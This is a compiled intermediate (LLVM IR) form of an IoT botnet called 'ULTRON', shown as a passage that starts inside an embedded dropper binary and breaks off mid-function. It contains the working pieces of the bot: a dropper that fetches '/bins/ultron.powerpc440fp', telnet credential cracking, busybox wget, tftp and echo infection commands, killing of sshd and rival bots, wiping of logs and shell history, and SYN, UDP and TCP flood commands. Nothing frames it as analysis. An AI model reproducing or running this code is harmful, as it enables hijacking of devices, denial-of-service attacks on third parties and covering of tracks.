<\80\10\008`\00\018\84\04t8\A0\00\04K\FF\FEu|\7F\00\D0K\FF\FD\A1;\BD\00\1D<\80\10\008\84\04|\7F\C3\F3x\7F\A5\EBxK\FF\FEU\7F\83\E8\00A\9E\00\0C8`\00\03K\FF\FDy;\A0\00\008\81\00\088\A0\00\01\7F\C3\F3xK\FF\FEi/\83\00\018`\00\04A\9E\00\08K\FF\FDU\89a\00\08W\A9@.<\00\0D\0A`\00\0D\0A}=[x\7F\9D\00\00@\9E\FF\C8;\A1\00\1C8\A0\00\80\7F\A4\EBx\7F\C3\F3xK\FF\FE)\7F\A4\EBx|e\1By\7F\83\E3x@\81\00\0CK\FF\FD\DDK\FF\FF\D8\7F\C3\F3xK\FF\FD1\7F\83\E3xK\FF\FD)<\80\10\008\84\04\A88\A0\00\048`\00\01K\FF\FD\B58`\00\05K\FF\FC\E1\80\01\00\C4\BB\81\00\B08!\00\C0|\08\03\A6N\80\00 K\FF\FE@|`\1Bx|\83#x|\A4+x|\C53x|\E6;x}\07CxD\00\00\02L\83\00 H\00\00\04\94!\FF\E0|\08\02\A6\BF\A1\00\14|}\1Bx\90\01\00$H\00\00!\93\A3\00\008`\FF\FF\80\01\00$\BB\A1\00\148!\00 |\08\03\A6N\80\00 <`\10\018c\04\B0N\80\00 powerpc440fp\00\00\00\00ULTRON\0A\00dvrHelper\00\00\00NIF\0A\00\00\00\00GET /bins/ultron.powerpc440fp HTTP/1.0\0D\0A\0D\0A\00\00FIN\0A\00\00\00\00\00GCC: (GNU) 4.1.2\00\00GCC: (GNU) 4.1.2\00\00GCC: (GNU) 4.1.2\00\00GCC: (GNU) 4.1.2\00\00.symtab\00.strtab\00.shstrtab\00.text\00.rodata\00.sbss\00.comment\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\1B\00\00\00\01\00\00\00\06\10\00\00\94\00\00\00\94\00\00\03\BC\00\00\00\00\00\00\00\00\00\00\00\04\00\00\00\00\00\00\00!\00\00\00\01\00\00\002\10\00\04P\00\00\04P\00\00\00`\00\00\00\00\00\00\00\00\00\00\00\04\00\00\00\01\00\00\00)\00\00\00\08\00\00\00\03\10\01\04\B0\00\00\04\B0\00\00\00\08\00\00\00\00\00\00\00\00\00\00\00\04\00\00\00\00\00\00\00/\00\00\00\01\00\00\00\00\00\00\00\00\00\00\04\B0\00\00\00H\00\00\00\00\00\00\00\00\00\00\00\01\00\00\00\00\00\00\00\11\00\00\00\03\00\00\00\00\00\00\00\00\00\00\04\F8\00\00\008\00\00\00\00\00\00\00\00\00\00\00\01\00\00\00\00\00\00\00\01\00\00\00\02\00\00\00\00\00\00\00\00\00\00\06p\00\00\02@\00\00\00\07\00\00\00\0D\00\00\00\04\00\00\00\10\00\00\00\09\00\00\00\03\00\00\00\00\00\00\00\00\00\00\08\B0\00\00\015\00\00\00\00\00\00\00\00\00\00\00\01\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\10\00\00\94\00\00\00\00\03\00\00\01\00\00\00\00\10\00\04P\00\00\00\00\03\00\00\02\00\00\00\00\10\01\04\B0\00\00\00\00\03\00\00\03\00\00\00\00\00\00\00\00\00\00\00\00\03\00\00\04\00\00\00\00\00\00\00\00\00\00\00\00\03\00\00\05\00\00\00\00\00\00\00\00\00\00\00\00\03\00\00\06\00\00\00\00\00\00\00\00\00\00\00\00\03\00\00\07\00\00\00\01\00\00\00\00\00\00\00\00\04\00\FF\F1\00\00\00\07\00\00\00\00\00\00\00\00\04\00\FF\F1\00\00\00,\00\00\00\00\00\00\00\00\04\00\FF\F1\00\00\00>\00\00\00\00\00\00\00\00\04\00\FF\F1\00\00\00Q\00\00\00\00\00\00\00\00\04\00\FF\F1\00\00\00Y\10\01\04\B4\00\00\00\04\11\02\00\03\00\00\00f\10\00\01\08\00\00\008\12\00\00\01\00\00\00l\10\00\03\EC\00\00\00$\12\00\00\01\00\00\00t\10\01\04\B4\00\00\00\04!\00\00\03\00\00\00}\10\01\04\B0\00\00\00\04\11\00\00\03\00\00\00\83\10\00\00\DC\00\00\00,\12\00\00\01\00\00\00\8A\10\00\00\B0\00\00\00,\12\00\00\01\00\00\00\92\10\00\01\EC\00\00\00<\12\00\00\01\00\00\00\9A\10\01\04\B4\00\00\00\04\11\00\00\03\00\00\00\A2\10\00\00\94\00\00\00\1C\12\00\00\01\00\00\00\B2\10\00\03\E8\00\00\00\04\12\00\00\01\00\00\00\BA\10\00\01|\00\00\008\12\00\00\01\00\00\00\C1\10\00\01@\00\00\00<\12\00\00\01\00\00\00\CA\10\00\04\10\00\00\004\12\02\00\01\00\00\00\DA\10\01\04\B0\00\00\00\00\10\00\FF\F1\00\00\00\E6\10\00\02(\00\00\01\C0\12\00\00\01\00\00\00\EA\10\00\01\B4\00\00\008\12\00\00\01\00\00\00\F0\10\01\04\B0\00\00\00\00\10\00\FF\F1\00\00\00\F7\10\01\04\B8\00\00\00\00\10\00\FF\F1\00\00\00\FC\10\00\04D\00\00\00\0C\22\00\00\01\00\00\01\0D\10\01\04\B0\00\00\00\04!\00\00\03\00\00\01\14\10\01\04\B0\00\00\00\04\11\02\00\03\00\00\01\1F\10\00\04D\00\00\00\0C\22\02\00\01\00dlr.c\00libc/sysdeps/linux/powerpc/syscall.S\00__syscall_error.c\00__errno_location.c\00errno.c\00__GI_h_errno\00xopen\00syscall\00_h_errno\00errno\00xclose\00x__exit\00xsocket\00h_errno\00utils_inet_addr\00__start\00xwrite\00xconnect\00__syscall_error\00__bss_start\00run\00xread\00_edata\00_end\00__errno_location\00_errno\00__GI_errno\00__GI___errno_location\00\00", align 1
@scanPid = common local_unnamed_addr global i32 0, align 4
@.str.232 = private unnamed_addr constant [13 x i8] c"kill -9 %s\0D\0A\00", align 1
@.str.233 = private unnamed_addr constant [30 x i8] c"killall -9 sshd;pkill -9 sshd\00", align 1
@.str.234 = private unnamed_addr constant [19 x i8] c"ps -C sshd -o pid=\00", align 1
@.str.235 = private unnamed_addr constant [11 x i8] c"kill -9 %s\00", align 1
@Q = internal unnamed_addr global [4096 x i32] zeroinitializer, align 16
@rand_cmwc.i = internal unnamed_addr global i32 4095, align 4
@c = internal unnamed_addr global i32 362436, align 4
@.str.327 = private unnamed_addr constant [7 x i8] c"(null)\00", align 1
@.str.261 = private unnamed_addr constant [4 x i8] c"%s\0A\00", align 1
@.str.263 = private unnamed_addr constant [12 x i8] c"%d.%d.%d.%d\00", align 1
@.str.276 = private unnamed_addr constant [5 x i8] c"%s\0D\0A\00", align 1
@.str.277 = private unnamed_addr constant [41 x i8] c"[TELNET] [+] LOGIN CRACKED ---> %s:%s:%s\00", align 1
@.str.278 = private unnamed_addr constant [28 x i8] c"sh\0D\0Ashell\0D\0Asystem\0D\0Aenable\0D\0A\00", align 1
@.str.279 = private unnamed_addr constant [42 x i8] c">%s.ULTRON && cd %s >ULTRON && >.ULTRON\0D\0A\00", align 1
@.str.280 = private unnamed_addr constant [24 x i8] c"/bin/busybox uname -a\0D\0A\00", align 1
@.str.282 = private unnamed_addr constant [41 x i8] c"/bin/busybox wget || /bin/busybox tftp\0D\0A\00", align 1
@.str.284 = private unnamed_addr constant [44 x i8] c"[ULTRON] Attempting wget infecton: %s:%s:%s\00", align 1
@.str.285 = private unnamed_addr constant [45 x i8] c"[ULTRON] Attempting tftp infection: %s:%s:%s\00", align 1
@.str.286 = private unnamed_addr constant [44 x i8] c"[ULTRON] Attempting echo infecton: %s:%s:%s\00", align 1
@.str.287 = private unnamed_addr constant [39 x i8] c"/bin/busybox echo -e '%s' >> dropper\0D\0A\00", align 1
@.str.288 = private unnamed_addr constant [41 x i8] c"[ULTRON] Failed echo infection: %s:%s:%s\00", align 1
@.str.289 = private unnamed_addr constant [28 x i8] c"[ULTRON] Finished: %s:%s:%s\00", align 1
@.str.290 = private unnamed_addr constant [4 x i8] c"std\00", align 1
@.str.291 = private unnamed_addr constant [17 x i8] c"pkill -9 busybox\00", align 1
@.str.292 = private unnamed_addr constant [43 x i8] c"rm -rf /tmp/* /var/* /var/run/* /var/tmp/*\00", align 1
@.str.293 = private unnamed_addr constant [21 x i8] c"rm -rf /var/log/wtmp\00", align 1
@.str.294 = private unnamed_addr constant [23 x i8] c"rm -rf ~/.bash_history\00", align 1
@.str.295 = private unnamed_addr constant [22 x i8] c"history -c;history -w\00", align 1
@.str.296 = private unnamed_addr constant [4 x i8] c"all\00", align 1
@.str.297 = private unnamed_addr constant [2 x i8] c",\00", align 1
@.str.298 = private unnamed_addr constant [4 x i8] c"syn\00", align 1
@.str.299 = private unnamed_addr constant [4 x i8] c"rst\00", align 1
@.str.300 = private unnamed_addr constant [4 x i8] c"fin\00", align 1
@.str.301 = private unnamed_addr constant [4 x i8] c"ack\00", align 1
@.str.302 = private unnamed_addr constant [4 x i8] c"psh\00", align 1
@.str.303 = private unnamed_addr constant [64 x i8] c"%s %s HTTP/1.1\0D\0AHost: %s\0D\0AUser-Agent: %s\0D\0AConnection: close\0D\0A\0D\0A\00", align 1
@.str.304 = private unnamed_addr constant [26 x i8] c"cd /;rm -rf .bash_history\00", align 1
@.str.305 = private unnamed_addr constant [5 x i8] c"PING\00", align 1
@.str.306 = private unnamed_addr constant [7 x i8] c"TELNET\00", align 1
@.str.307 = private unnamed_addr constant [3 x i8] c"ON\00", align 1
@.str.308 = private unnamed_addr constant [4 x i8] c"OFF\00", align 1
@.str.309 = private unnamed_addr constant [9 x i8] c"FASTLOAD\00", align 1
@.str.310 = private unnamed_addr constant [22 x i8] c"SCAN <threads> <usec>\00", align 1
@.str.311 = private unnamed_addr constant [19 x i8] c"Starting scanner!!\00", align 1
@.str.312 = private unnamed_addr constant [5 x i8] c"HTTP\00", align 1
@.str.313 = private unnamed_addr constant [5 x i8] c"UATK\00", align 1
@.str.314 = private unnamed_addr constant [5 x i8] c"TATK\00", align 1
@.str.315 = private unnamed_addr constant [5 x i8] c"SATK\00", align 1
@.str.316 = private unnamed_addr constant [13 x i8] c"FUCKALLOFYOU\00", align 1
@.str.317 = private unnamed_addr constant [9 x i8] c"KILLATTK\00", align 1
@.str.318 = private unnamed_addr constant [6 x i8] c"LMFAO\00", align 1
@.str.319 = private unnamed_addr constant [16 x i8] c"CLEANTHATSHITUP\00", align 1
@.str.320 = private unnamed_addr constant [19 x i8] c"[cleaning] [%s:%s]\00", align 1
@.str.321 = private unnamed_addr constant [17 x i8] c"/etc/resolv.conf\00", align 1
@.str.322 = private unnamed_addr constant [39 x i8] c"nameserver 8.8.8.8\0Anameserver 8.8.4.4\0A\00", align 1
@getRandomPublicIP.ipState.0 = internal unnamed_addr global i8 0, align 1
@getRandomPublicIP.ipState.1 = internal unnamed_addr global i8 0, align 1
@getRandomPublicIP.ipState.2 = internal unnamed_addr global i8 0, align 1
@getRandomPublicIP.ipState.3 = internal unnamed_addr global i8 0, align 1

; Function Attrs: noinline norecurse nounwind readnone uwtable
define i8* @getBuild() local_unnamed_addr #0 {
  ret i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str, i64 0, i64 0)
}

; Function Attrs: noinline nounwind uwtable
define void @bot_killer() local_unnamed_addr #1 {
  br label %1

; <label>:1:                                      ; preds = %1, %0
  %indvars.iv = phi i64 [ 0, %0 ], [ %indvars.iv.next, %1 ]
  %2 = load i8, i8* @buf, align 1
  %3 = sext i8 %2 to i64
  %4 = inttoptr i64 %3 to i8*
  %5 = getelementptr inbounds [176 x i8*], [176 x i8*]* @Bot_Killer_Binarys, i64 0, i64 %indvars.iv
  %6 = load i8*, i8** %5, align 8
  %7 = tail call i32 (i8*, i8*, ...) @sprintf(i8* %4, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.232, i64 0, i64 0), i8* %6) #7
  %8 = load i8, i8* @buf, align 1
  %9 = sext i8 %8 to i64
  %10 = inttoptr i64 %9 to i8*
  %11 = tail call i32 @system(i8* %10) #7
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %exitcond = icmp eq i64 %indvars.iv.next, 184
  br i1 %exitcond, label %12, label %1

; <label>:12:                                     ; preds = %1
  ret void
}

; Function Attrs: nounwind
declare i32 @sprintf(i8* nocapture, i8* nocapture readonly, ...) local_unnamed_addr #2

declare i32 @system(i8* nocapture readonly) local_unnamed_addr #3

; Function Attrs: noinline nounwind uwtable
define void @port_closer() local_unnamed_addr #1 {
  %1 = tail call i32 @system(i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str.233, i64 0, i64 0)) #7
  tail call void @llvm.memcpy.p0i8.p0i8.i64(i8* getelementptr inbounds ([1024 x i8], [1024 x i8]* @input, i64 0, i64 0), i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.234, i64 0, i64 0), i64 19, i32 1, i1 false)
  %2 = tail call i32 @system(i8* getelementptr inbounds ([1024 x i8], [1024 x i8]* @input, i64 0, i64 0)) #7
  %3 = tail call i8* @strcpy(i8* getelementptr inbounds ([1024 x i8], [1024 x i8]* @input, i64 0, i64 0), i8* getelementptr inbounds ([1024 x i8], [1024 x i8]* @output, i64 0, i64 0)) #7
  %4 = load i8, i8* @buf, align 1
  %5 = sext i8 %4 to i64
  %6 = inttoptr i64 %5 to i8*
  %7 = tail call i32 (i8*, i8*, ...) @sprintf(i8* %6, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.235, i64 0, i64 0), i8* getelementptr inbounds ([1024 x i8], [1024 x i8]* @output, i64 0, i64 0)) #7
  %8 = load i8, i8* @buf, align 1
  %9 = sext i8 %8 to i64
  %10 = inttoptr i64 %9 to i8*
  %11 = tail call i32 @system(i8* %10) #7
  ret void
}

; Function Attrs: nounwind
declare i8* @strcpy(i8*, i8* nocapture readonly) local_unnamed_addr #2

; Function Attrs: noinline norecurse nounwind uwtable
define void @init_rand(i32) local_unnamed_addr #4 {
min.iters.checked:
  store i32 %0, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 0), align 16
  %1 = add i32 %0, -1640531527
  store i32 %1, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 1), align 4
  %2 = add i32 %0, 1013904242
  store i32 %2, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 2), align 8
  %vector.recur.init = insertelement <2 x i32> undef, i32 %0, i32 1
  %load_initial = load <2 x i32>, <2 x i32>* bitcast (i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 1) to <2 x i32>*), align 4
  br label %vector.body

vector.body:                                      ; preds = %vector.body, %min.iters.checked
  %store_forwarded = phi <2 x i32> [ %load_initial, %min.iters.checked ], [ %16, %vector.body ]
  %index = phi i64 [ 0, %min.iters.checked ], [ %index.next.1, %vector.body ]
  %vector.recur = phi <2 x i32> [ %vector.recur.init, %min.iters.checked ], [ %8, %vector.body ]
  %vec.ind = phi <2 x i64> [ <i64 3, i64 4>, %min.iters.checked ], [ %vec.ind.next.1, %vector.body ]
  %3 = or i64 %index, 3
  %4 = shufflevector <2 x i32> %vector.recur, <2 x i32> %store_forwarded, <2 x i32> <i32 1, i32 2>
  %5 = trunc <2 x i64> %vec.ind to <2 x i32>
  %6 = xor <2 x i32> %5, <i32 -1640531527, i32 -1640531527>
  %7 = xor <2 x i32> %6, %4
  %8 = xor <2 x i32> %7, %store_forwarded
  %9 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %3
  %10 = bitcast i32* %9 to <2 x i32>*
  store <2 x i32> %8, <2 x i32>* %10, align 4
  %vec.ind.next = add <2 x i64> %vec.ind, <i64 2, i64 2>
  %11 = add nsw i64 %index, 5
  %12 = shufflevector <2 x i32> %store_forwarded, <2 x i32> %8, <2 x i32> <i32 1, i32 2>
  %13 = trunc <2 x i64> %vec.ind.next to <2 x i32>
  %14 = xor <2 x i32> %13, <i32 -1640531527, i32 -1640531527>
  %15 = xor <2 x i32> %14, %12
  %16 = xor <2 x i32> %15, %8
  %17 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %11
  %18 = bitcast i32* %17 to <2 x i32>*
  store <2 x i32> %16, <2 x i32>* %18, align 4
  %index.next.1 = add nsw i64 %index, 4
  %vec.ind.next.1 = add <2 x i64> %vec.ind, <i64 4, i64 4>
  %19 = icmp eq i64 %index.next.1, 4092
  br i1 %19, label %middle.block, label %vector.body, !llvm.loop !1

middle.block:                                     ; preds = %vector.body
  br label %._crit_edge

._crit_edge:                                      ; preds = %middle.block
  %vector.recur.extract = extractelement <2 x i32> %8, i32 1
  %20 = load i32, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 4093), align 4
  %21 = xor i32 %vector.recur.extract, -1640532410
  %22 = xor i32 %21, %20
  store i32 %22, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 4095), align 4
  ret void
}

; Function Attrs: noinline norecurse nounwind uwtable
define i32 @rand_cmwc() local_unnamed_addr #4 {
  %1 = load i32, i32* @rand_cmwc.i, align 4
  %2 = add i32 %1, 1
  %3 = and i32 %2, 4095
  store i32 %3, i32* @rand_cmwc.i, align 4
  %4 = zext i32 %3 to i64
  %5 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %4
  %6 = load i32, i32* %5, align 4
  %7 = zext i32 %6 to i64
  %8 = mul nuw nsw i64 %7, 18782
  %9 = load i32, i32* @c, align 4
  %10 = zext i32 %9 to i64
  %11 = add nuw nsw i64 %8, %10
  %12 = lshr i64 %11, 32
  %13 = trunc i64 %12 to i32
  %14 = add nuw nsw i64 %12, %11
  %15 = trunc i64 %14 to i32
  %16 = icmp ult i32 %15, %13
  %17 = zext i1 %16 to i32
  %storemerge = add nuw nsw i32 %17, %13
  store i32 %storemerge, i32* @c, align 4
  %.neg7 = sext i1 %16 to i32
  %.0.neg = sub i32 -2, %15
  %18 = add i32 %.0.neg, %.neg7
  store i32 %18, i32* %5, align 4
  ret i32 %18
}

; Function Attrs: noinline nounwind uwtable
define i32 @contains_string(i8*, i8** nocapture readonly) local_unnamed_addr #1 {
  br label %3

; <label>:3:                                      ; preds = %3, %2
  %indvars.iv13 = phi i64 [ %indvars.iv.next14, %3 ], [ 0, %2 ]
  %indvars.iv.next14 = add nuw nsw i64 %indvars.iv13, 1
  %4 = getelementptr inbounds i8*, i8** %1, i64 %indvars.iv.next14
  %5 = load i8*, i8** %4, align 8
  %6 = icmp eq i8* %5, null
  br i1 %6, label %.preheader, label %3

.preheader:                                       ; preds = %3
  %7 = trunc i64 %indvars.iv13 to i32
  %8 = icmp slt i32 %7, 0
  br i1 %8, label %._crit_edge, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %.preheader
  %sext = shl i64 %indvars.iv13, 32
  %9 = ashr exact i64 %sext, 32
  br label %.lr.ph

; <label>:10:                                     ; preds = %.lr.ph
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %11 = icmp slt i64 %indvars.iv, %9
  br i1 %11, label %.lr.ph, label %._crit_edge.loopexit

.lr.ph:                                           ; preds = %.lr.ph.preheader, %10
  %indvars.iv = phi i64 [ 0, %.lr.ph.preheader ], [ %indvars.iv.next, %10 ]
  %12 = getelementptr inbounds i8*, i8** %1, i64 %indvars.iv
  %13 = load i8*, i8** %12, align 8
  %14 = tail call i32 (i8*, i8*, ...) bitcast (i32 (...)* @strcasestr to i32 (i8*, i8*, ...)*)(i8* %0, i8* %13) #7
  %15 = icmp eq i32 %14, 0
  br i1 %15, label %10, label %._crit_edge.loopexit

._crit_edge.loopexit:                             ; preds = %.lr.ph, %10
  %.09.ph = phi i32 [ 0, %10 ], [ 1, %.lr.ph ]
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %.preheader
  %.09 = phi i32 [ 0, %.preheader ], [ %.09.ph, %._crit_edge.loopexit ]
  ret i32 %.09
}

declare i32 @strcasestr(...) local_unnamed_addr #3

; Function Attrs: noinline nounwind uwtable
define i32 @contains_success(i8*) local_unnamed_addr #1 {
  %2 = tail call i32 @contains_string(i8* %0, i8** getelementptr inbounds ([6 x i8*], [6 x i8*]* @successes, i64 0, i64 0))
  ret i32 %2
}

; Function Attrs: noinline nounwind uwtable
define i32 @contains_fail(i8*) local_unnamed_addr #1 {
  %2 = tail call i32 @contains_string(i8* %0, i8** getelementptr inbounds ([8 x i8*], [8 x i8*]* @fails, i64 0, i64 0))
  ret i32 %2
}

; Function Attrs: noinline nounwind uwtable
define i32 @contains_response(i8*) local_unnamed_addr #1 {
  %2 = tail call i32 @contains_success(i8* %0)
  %3 = icmp eq i32 %2, 0
  br i1 %3, label %4, label %7

; <label>:4:                                      ; preds = %1
  %5 = tail call i32 @contains_fail(i8* %0)
  %6 = icmp ne i32 %5, 0
  br label %7

; <label>:7:                                      ; preds = %1, %4
  %8 = phi i1 [ true, %1 ], [ %6, %4 ]
  %9 = zext i1 %8 to i32
  ret i32 %9
}

; Function Attrs: noinline nounwind uwtable
define i32 @read_with_timeout(i32, i32, i8*, i32) local_unnamed_addr #1 {
  %5 = alloca %struct.fd_set, align 8
  %6 = alloca %struct.timeval, align 8
  %7 = getelementptr inbounds %struct.timeval, %struct.timeval* %6, i64 0, i32 0
  store i64 0, i64* %7, align 8
  %8 = sext i32 %1 to i64
  %9 = getelementptr inbounds %struct.timeval, %struct.timeval* %6, i64 0, i32 1
  store i64 %8, i64* %9, align 8
  %10 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %5, i64 0, i32 0, i64 0
  %11 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* nonnull %10) #7, !srcloc !4
  %12 = srem i32 %0, 64
  %13 = zext i32 %12 to i64
  %14 = shl i64 1, %13
  %15 = sdiv i32 %0, 64
  %16 = sext i32 %15 to i64
  %17 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %5, i64 0, i32 0, i64 %16
  %18 = load i64, i64* %17, align 8
  %19 = or i64 %18, %14
  store i64 %19, i64* %17, align 8
  %20 = add nsw i32 %0, 1
  %21 = call i32 @select(i32 %20, %struct.fd_set* nonnull %5, %struct.fd_set* null, %struct.fd_set* null, %struct.timeval* nonnull %6) #7
  %22 = icmp slt i32 %21, 1
  br i1 %22, label %27, label %23

; <label>:23:                                     ; preds = %4
  %24 = sext i32 %3 to i64
  %25 = call i64 @recv(i32 %0, i8* %2, i64 %24, i32 0) #7
  %26 = trunc i64 %25 to i32
  br label %27

; <label>:27:                                     ; preds = %4, %23
  %.0 = phi i32 [ %26, %23 ], [ 0, %4 ]
  ret i32 %.0
}

declare i32 @select(i32, %struct.fd_set*, %struct.fd_set*, %struct.fd_set*, %struct.timeval*) local_unnamed_addr #3

declare i64 @recv(i32, i8*, i64, i32) local_unnamed_addr #3

; Function Attrs: noinline nounwind uwtable
define i32 @read_until_response(i32, i32, i8*, i32, i8** nocapture readonly) local_unnamed_addr #1 {
  %6 = sext i32 %3 to i64
  tail call void @llvm.memset.p0i8.i64(i8* %2, i8 0, i64 %6, i32 1, i1 false)
  %7 = tail call i32 @read_with_timeout(i32 %0, i32 %1, i8* %2, i32 %3)
  %8 = tail call i32 @contains_string(i8* %2, i8** %4)
  %not. = icmp ne i32 %8, 0
  %.0 = zext i1 %not. to i32
  ret i32 %.0
}

; Function Attrs: argmemonly nounwind
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i32, i1) #5

; Function Attrs: noinline nounwind uwtable
define i32 @negotiate(i32, i8*, i32) local_unnamed_addr #1 {
  %4 = alloca i8, align 1
  %5 = getelementptr inbounds i8, i8* %1, i64 1
  %6 = load i8, i8* %5, align 1
  %.off = add i8 %6, 5
  %switch = icmp ult i8 %.off, 4
  br i1 %switch, label %7, label %20

; <label>:7:                                      ; preds = %3
  store i8 -1, i8* %4, align 1
  %8 = call i64 @send(i32 %0, i8* nonnull %4, i64 1, i32 16384) #7
  %9 = load i8, i8* %5, align 1
  switch i8 %9, label %13 [
    i8 -4, label %10
    i8 -2, label %11
    i8 3, label %12
  ]

; <label>:10:                                     ; preds = %7
  store i8 -2, i8* %4, align 1
  br label %16

; <label>:11:                                     ; preds = %7
  store i8 -4, i8* %4, align 1
  br label %16

; <label>:12:                                     ; preds = %7
  store i8 -3, i8* %4, align 1
  br label %16

; <label>:13:                                     ; preds = %7
  %14 = icmp eq i8 %9, -3
  %15 = select i1 %14, i8 -4, i8 -2
  store i8 %15, i8* %4, align 1
  br label %16

; <label>:16:                                     ; preds = %11, %13, %12, %10
  %17 = call i64 @send(i32 %0, i8* nonnull %4, i64 1, i32 16384) #7
  %18 = getelementptr inbounds i8, i8* %1, i64 2
  %19 = call i64 @send(i32 %0, i8* %18, i64 1, i32 16384) #7
  br label %20

; <label>:20:                                     ; preds = %3, %16
  ret i32 0
}

declare i64 @send(i32, i8*, i64, i32) local_unnamed_addr #3

; Function Attrs: noinline nounwind uwtable
define i8* @get_telstate_host(%struct.telstate_t* nocapture readonly) local_unnamed_addr #1 {
  %2 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %0, i64 0, i32 1
  %3 = load i32, i32* %2, align 4
  %4 = tail call i8* @inet_ntoa(i32 %3) #7
  ret i8* %4
}

; Function Attrs: nounwind
declare i8* @inet_ntoa(i32) local_unnamed_addr #2

; Function Attrs: noinline nounwind uwtable
define void @advance_telstate(%struct.telstate_t* nocapture, i32) local_unnamed_addr #1 {
  %3 = icmp eq i32 %1, 0
  br i1 %3, label %4, label %8

; <label>:4:                                      ; preds = %2
  %5 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %0, i64 0, i32 0
  %6 = load i32, i32* %5, align 8
  %7 = tail call i32 @close(i32 %6) #7
  br label %8

; <label>:8:                                      ; preds = %4, %2
  %9 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %0, i64 0, i32 7
  store i32 0, i32* %9, align 8
  %10 = trunc i32 %1 to i8
  %11 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %0, i64 0, i32 2
  store i8 %10, i8* %11, align 8
  %12 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %0, i64 0, i32 9
  %13 = load i8*, i8** %12, align 8
  tail call void @llvm.memset.p0i8.i64(i8* %13, i8 0, i64 1024, i32 1, i1 false)
  ret void
}

declare i32 @close(i32) local_unnamed_addr #3

; Function Attrs: noinline nounwind uwtable
define void @reset_telstate(%struct.telstate_t* nocapture) local_unnamed_addr #1 {
  tail call void @advance_telstate(%struct.telstate_t* %0, i32 0)
  %2 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %0, i64 0, i32 3
  store i8 1, i8* %2, align 1
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @trim2(i8* nocapture) local_unnamed_addr #1 {
  %2 = tail call i64 @strlen(i8* %0) #14
  %3 = add i64 %2, 4294967295
  br label %4

; <label>:4:                                      ; preds = %4, %1
  %indvars.iv29 = phi i64 [ %indvars.iv.next30, %4 ], [ 0, %1 ]
  %5 = getelementptr inbounds i8, i8* %0, i64 %indvars.iv29
  %6 = load i8, i8* %5, align 1
  %7 = sext i8 %6 to i32
  %8 = tail call i32 @isspace(i32 %7) #14
  %9 = icmp eq i32 %8, 0
  %indvars.iv.next30 = add nuw i64 %indvars.iv29, 1
  br i1 %9, label %.preheader, label %4

.preheader:                                       ; preds = %4
  %10 = trunc i64 %3 to i32
  %11 = trunc i64 %indvars.iv29 to i32
  %12 = icmp slt i32 %10, %11
  br i1 %12, label %.critedge.preheader, label %.lr.ph22.preheader

.lr.ph22.preheader:                               ; preds = %.preheader
  %sext = shl i64 %3, 32
  %13 = ashr exact i64 %sext, 32
  %sext31 = shl i64 %indvars.iv29, 32
  %14 = ashr exact i64 %sext31, 32
  br label %.lr.ph22

.critedge.preheader.loopexit:                     ; preds = %.lr.ph22, %80
  %.0.lcssa.ph = phi i32 [ %79, %.lr.ph22 ], [ %81, %80 ]
  br label %.critedge.preheader

.critedge.preheader:                              ; preds = %.critedge.preheader.loopexit, %.preheader
  %.0.lcssa = phi i32 [ %10, %.preheader ], [ %.0.lcssa.ph, %.critedge.preheader.loopexit ]
  %15 = icmp sgt i32 %11, %.0.lcssa
  br i1 %15, label %.critedge._crit_edge, label %.critedge.preheader26

.critedge.preheader26:                            ; preds = %.critedge.preheader
  %sext32 = shl i64 %indvars.iv29, 32
  %16 = ashr exact i64 %sext32, 32
  %17 = sext i32 %.0.lcssa to i64
  %18 = icmp sgt i64 %17, %16
  %smax = select i1 %18, i64 %17, i64 %16
  %19 = add nsw i64 %smax, 1
  %20 = sub nsw i64 %19, %16
  %min.iters.check = icmp ult i64 %20, 32
  br i1 %min.iters.check, label %.critedge.preheader39, label %min.iters.checked

.critedge.preheader39:                            ; preds = %middle.block, %vector.memcheck, %min.iters.checked, %.critedge.preheader26
  %indvars.iv.ph = phi i64 [ %16, %vector.memcheck ], [ %16, %min.iters.checked ], [ %16, %.critedge.preheader26 ], [ %ind.end, %middle.block ]
  br label %.critedge

min.iters.checked:                                ; preds = %.critedge.preheader26
  %n.vec = and i64 %20, -32
  %cmp.zero = icmp eq i64 %n.vec, 0
  br i1 %cmp.zero, label %.critedge.preheader39, label %vector.memcheck

vector.memcheck:                                  ; preds = %min.iters.checked
  %21 = icmp sgt i64 %17, %16
  %smax34 = select i1 %21, i64 %17, i64 %16
  %22 = add nsw i64 %smax34, 1
  %23 = sub nsw i64 %22, %16
  %scevgep = getelementptr i8, i8* %0, i64 %23
  %scevgep35 = getelementptr i8, i8* %0, i64 %16
